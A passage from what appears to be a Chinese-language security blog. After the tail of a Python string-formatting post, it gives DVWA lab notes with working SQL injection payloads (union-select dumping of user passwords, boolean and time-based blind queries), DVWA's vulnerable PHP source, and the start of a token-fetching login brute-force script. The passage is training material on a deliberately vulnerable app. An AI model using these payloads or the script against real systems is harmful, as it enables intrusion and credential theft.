class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&#x27;name&#x27;</span></span><br><span class="line">b = <span class="string">&#x27;0pt1mus&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;my &#123;&#125; is &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(a, b)</span><br><span class="line"><span class="string">f&#x27;my <span class="subst">&#123;a&#125;</span> is <span class="subst">&#123;b&#125;</span>&#x27;</span></span><br></pre></td></tr></table></figure><p>上面的两种格式化字符串都没有问题，但<code>f&#39;&#39;</code>是不是更加方便呐。</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA学习笔记</title>
      <link href="2020/02/11/20200211094241/"/>
      <url>2020/02/11/20200211094241/</url>
      
        <content type="html"><![CDATA[<h1 id="sql-injection："><a href="#sql-injection：" class="headerlink" title="sql injection："></a>sql injection：</h1><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>首先，通过返回的报错信息判断是否存在注入点，并判断注入点的类型是<code>数字型</code>还是<code>字符型</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 判断注入可以直接输入&#39;或1’</span><br><span class="line"># 首先判断是否为数字型的</span><br><span class="line">1 and 1&#x3D;1# 有返回</span><br><span class="line">1 and 1&#x3D;2# 有返回</span><br><span class="line"># 证明该处的逻辑后台并没有进行处理</span><br><span class="line"></span><br><span class="line"># 测试字符型</span><br><span class="line">1&#39; and &#39;1&#39;&#x3D;&#39;1 # 有返回</span><br><span class="line">1&#39; and &#39;1&#39;&#x3D;&#39;2# 无返回</span><br><span class="line"># 证明这里的逻辑后台处理了，因此判断该处为字符型注入</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/2020/02/11/20200211094241/image-20200211193753241.png" alt="image-20200211193753241"></p><p>知道存在字符型注入点，现在要测试有几个字段，构造sql语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#39; order by 3;#</span><br><span class="line">1&#39; order by 2;#</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/2020/02/11/20200211094241/image-20200211193622250.png" alt="image-20200211193622250"></p><p><img src= "/img/loading.gif" data-lazy-src="/2020/02/11/20200211094241/image-20200211193706953.png" alt="image-20200211193706953"></p><p>通过二分法判断，最后得出查询的字段有两个。</p><p>接下来我们就可以通过联合查询来对这两个位置进行注入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查询数据库版本</span><br><span class="line">1&#39; union select 1,version();#</span><br></pre></td></tr></table></figure><img src= "/img/loading.gif" data-lazy-src="/2020/02/11/20200211094241/image-20200211193839853.png" alt="image-20200211193839853" style="zoom:50%;"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查询数据库名</span><br><span class="line">1&#39; union select 1,database();#</span><br></pre></td></tr></table></figure><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200213155655.png" style="zoom:50%;"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查询dvwa数据库的表名称</span><br><span class="line">1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39;;#</span><br></pre></td></tr></table></figure><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200213155831.png" style="zoom:50%;"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查询表users的列</span><br><span class="line">1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;;#</span><br></pre></td></tr></table></figure><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200213155944.png" style="zoom:50%;"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查询user、password的内容</span><br><span class="line">1&#39; union select user,password from users;#</span><br></pre></td></tr></table></figure><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200213160438.png" style="zoom:50%;"><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line">    <span class="variable">$id</span> = mysql_real_escape_string( <span class="variable">$id</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="variable">$num</span> = mysql_numrows( <span class="variable">$result</span> );</span><br><span class="line">    <span class="variable">$i</span>   = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$i</span> &lt; <span class="variable">$num</span> ) &#123;</span><br><span class="line">        <span class="comment">// Display values</span></span><br><span class="line">        <span class="variable">$first</span> = mysql_result( <span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">&quot;first_name&quot;</span> );</span><br><span class="line">        <span class="variable">$last</span>  = mysql_result( <span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">&quot;last_name&quot;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Increase loop count</span></span><br><span class="line">        <span class="variable">$i</span>++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>观察页面，发现是通过下拉框来点击选择ID，我们有bp抓包，发现通过POST请求将ID传递给服务器，因此我们可以通过hack bar修改POST请求包进行注入。</p><p>源码发现中间通过函数<code>mysql_real_escape_string()</code>将特殊的字符全部转义了，所以我们可以通过十六进制绕过。</p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_SESSION</span> [ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_SESSION</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="variable">$num</span> = mysql_numrows( <span class="variable">$result</span> );</span><br><span class="line">    <span class="variable">$i</span>   = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$i</span> &lt; <span class="variable">$num</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = mysql_result( <span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">&quot;first_name&quot;</span> );</span><br><span class="line">        <span class="variable">$last</span>  = mysql_result( <span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">&quot;last_name&quot;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Increase loop count</span></span><br><span class="line">        <span class="variable">$i</span>++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以发现在sql语句中添加了<code>limit 1</code>限制了返回的数据只有一条。我们可以在查询语句中通过将后面的语句注释掉来进行绕过。</p><p>这里提交sql语句和查询结果显示的界面不在一块，是为了防止一般的sqlmap注入。</p><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( <span class="variable">$id</span> )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:id&#x27;</span>, <span class="variable">$id</span>, PDO::PARAM_INT );</span><br><span class="line">        <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;fetch();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            <span class="variable">$first</span> = <span class="variable">$row</span>[ <span class="string">&#x27;first_name&#x27;</span> ];</span><br><span class="line">            <span class="variable">$last</span>  = <span class="variable">$row</span>[ <span class="string">&#x27;last_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先添加了<code>Anti-CSRF token</code>，又对输入的id判断是否为数字，是数字才能进行下一步的操作，并且使用了PDO对sql语句进行了预编译。最后查询结果必须只有一条，才进行输出。</p><h1 id="SQL-Injection（Blind）"><a href="#SQL-Injection（Blind）" class="headerlink" title="SQL Injection（Blind）"></a>SQL Injection（Blind）</h1><h2 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h2><p>SQL Injection（Blind），即SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。</p><p>基本的盲注有时间盲注，bool盲注。</p><h4 id="bool盲注："><a href="#bool盲注：" class="headerlink" title="bool盲注："></a>bool盲注：</h4><p>因为返回的只有是或否，所以我们可以通过bool值进行判断。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and user()&#x3D;&#39;root@localhost&#39;;</span><br><span class="line">1&#39; and user() like &#39;ro%&#39;;</span><br></pre></td></tr></table></figure><h4 id="时间盲注："><a href="#时间盲注：" class="headerlink" title="时间盲注："></a>时间盲注：</h4><p>时间盲注中，我们通过判断返回的时候是否执行了函数sleep。我们通过if来进行判断，如果判断值为真，执行sleep函数，如果判断为假，不执行sleep函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and if(ascii(mid(select group_concat(column_name) from information_schema.columns where table_schema &#x3D;0x73716C74657374 and table_name &#x3D;0x61646D696E), 1, 1)) &#x3D; 0,sleep(5),1);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拆解上面的sql语句，就是执行select语句，查询结果从第一个位置取其ascii码与0进行比较，若返回真，执行slee(5)，若返回假，返回1。</p><h1 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h1><h2 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h2><p>我们可以采用Burp suite抓包后，进行字典暴力破解。</p><img src= "/img/loading.gif" data-lazy-src="/2020/02/11/20200211094241/image-20200213161313485.png" alt="image-20200213161313485" style="zoom:50%;"><p>可以根据返回的<code>length</code>进行判断，只有<code>admin/password</code>的长度和别的不同，打开发现，登录成功。</p><h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = mysql_real_escape_string( <span class="variable">$user</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = mysql_real_escape_string( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysql_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$avatar</span> = mysql_result( <span class="variable">$result</span>, <span class="number">0</span>, <span class="string">&quot;avatar&quot;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( <span class="number">2</span> );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>查看源码，发现函数<code>mysql_real_escape_string()</code>，作用是转义 SQL 语句中使用的字符串中的特殊字符（\x00，\n，\r，\，‘，“，\x1a）。基本可以抵抗SQL注入。</p><p>并且在验证错误的时候，会<code>sleep(2)</code>睡眠两秒，但任然可以和low级一样，进行bp的爆破。</p><h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = stripslashes( <span class="variable">$user</span> );</span><br><span class="line">    <span class="variable">$user</span> = mysql_real_escape_string( <span class="variable">$user</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = stripslashes( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = mysql_real_escape_string( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysql_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$avatar</span> = mysql_result( <span class="variable">$result</span>, <span class="number">0</span>, <span class="string">&quot;avatar&quot;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>stripslashes()</code>:去除string中的反斜杠<code>\</code>。</p><p><code>mysql_real_escape_string()</code>:转义 SQL 语句中使用的字符串中的特殊字符（\x00，\n，\r，\，‘，“，\x1a）。</p><p>还用了<code>Anti-CSRF token</code>抵御CSRF。</p><p>然后我们再在网页的源码中发现隐藏的<code>user_token</code>。</p><p>我们尝试提交一次请求，发现url中含有参数<code>user-token</code>。</p><p>因此，判断该登录的逻辑为，后台通过<code>generateSessionToken()</code>产生token，然后传递到前端隐藏掉，在发起登录请求时，将<code>user_token</code>也传到后端，然后进行check，因此，爆破的时候不能再用bp进行。</p><p>通过python脚本来进行爆破，先请求服务器获得token，然后开始爆破。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 还可以将该脚本改成多线程的形式，加快速度</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh,en;q=0.9,zh-CN;q=0.8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;security=high; PHPSESSID=364ucqbn2j1mucgtmkpes17fd1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;172.16.34.167&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Pragma&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://172.16.34.167/dvwa/vulnerabilities/brute/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span 